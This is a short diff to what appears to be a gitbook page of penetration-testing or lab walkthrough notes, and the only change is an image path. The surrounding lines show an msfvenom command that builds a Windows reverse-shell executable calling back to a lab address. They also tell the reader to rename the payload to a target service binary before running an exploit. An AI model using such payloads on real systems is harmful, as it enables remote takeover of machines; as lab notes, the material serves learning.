@@ -74,7 +74,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=7890 -f exe -o 
 
 make a copy of the payload **(one wil be corrupted in the first attempt)**
 
-![](<../../.gitbook/assets/image (125).png>) **(make sure to rename them to the target binary or mainenanceservice.exe)**
+![](<../../.gitbook/assets/image (125) (1).png>) **(make sure to rename them to the target binary or mainenanceservice.exe)**
 
 executing the exploit along with the first reverse shell payload **(make sure that the files passed in are all full path!!)**
 
